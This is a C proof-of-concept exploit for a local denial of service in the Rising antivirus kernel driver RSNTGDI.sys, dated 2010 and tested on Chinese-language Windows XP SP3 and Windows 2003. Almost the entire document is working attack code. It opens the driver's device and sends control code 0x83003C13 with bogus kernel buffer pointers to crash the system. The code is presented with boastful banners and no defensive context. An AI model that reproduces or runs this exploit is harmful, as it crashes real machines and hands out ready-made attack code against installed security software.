/*
On the net.We can found these file has published a BUG.In that.The BUG has found in CONTROL CODE:0x83003C0B.So.I check these file
in othere CONTROL CODE.Just for fun.....

# Exploit Title: [Rising RSNTGDI.sys Local Denial of Service(CONTROL CODE:83003C13) ]
# Date: [2010.11.1]
# Author: [ ze0r ]
# Version: [Rising 2009.Publish Date:2009.10.13.]
# Tested on: [Windows XPSP3 Chinese Simplified & Windows 2003 Chinese Simplified]
*/


#include "stdio.h"
#include "windows.h"

HANDLE DriverHandle =0; 

void boom(PVOID systembuffer,PVOID userbuffer)
{
	printf("userbuffer Is:%p\n\n",userbuffer);
	printf("The systembuffer Is:%p\n\n",systembuffer);
	DeviceIoControl(DriverHandle, 
	0x83003C13, 
	systembuffer,
	20,
	userbuffer, 
	20,
	(DWORD *)0, 
	0);
	return ; 
}

int main(int argc, char* argv[])
{
	printf("-------------------------------------------------------------------------------\n");
	printf("---------------------------C0ed By:ze0r,Let's ROCK!!---------------------------\n");
	printf("----------------------------------QQ:289791332---------------------------------\n");
	printf("-------------------------------------------------------------------------------\n\n");
	DriverHandle=CreateFile("\\\\.\\rsntgdi", 
	0,
	FILE_SHARE_READ | FILE_SHARE_WRITE , 
	0,
	OPEN_EXISTING,0,0);
	if (DriverHandle == INVALID_HANDLE_VALUE)
	{
		printf("Open Driver Error!\n\n");
		return 0 ; 
	}
	
	printf("OK.Let's Crash It!\n\n");
	getchar();

	boom((PVOID)0x88888888,(PVOID)0x88888888);
	
	return 0;
}